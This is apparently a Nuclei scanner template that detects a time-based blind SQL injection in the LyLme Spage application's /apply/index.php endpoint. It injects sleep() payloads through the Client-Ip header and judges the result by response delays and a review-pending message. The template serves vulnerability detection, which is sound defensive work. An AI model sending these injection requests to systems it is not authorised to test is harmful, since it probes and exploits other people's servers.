id: poc-yaml-lylme-spage-sqli
info:
  name: "LyLme Spage 应用 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: LyLme Spage
  description: |
    This template detects a SQL injection vulnerability in LyLme Spage application
    by leveraging a time-based blind SQL injection vector.

variables:
  t3: "{{rand_text_alphanumeric(10)}}"
http:
  - raw:
      - |
        POST /apply/index.php?submit=post HTTP/1.1
        Host: {{Hostname}}
        Client-Ip: 0'>if(1,sleep(5),2)>'
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        url=http://{{t3}}.com&name=test&group_id=1&icon=&authcode=
      - |
        POST /apply/index.php?submit=post HTTP/1.1
        Host: {{Hostname}}
        Client-Ip: 0'>if(1,sleep(8),2)>'
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        url=http://{{t3}}.com&name=test&group_id=1&icon=&authcode=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"code": "200", "msg": "请等待管理员审核"'
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
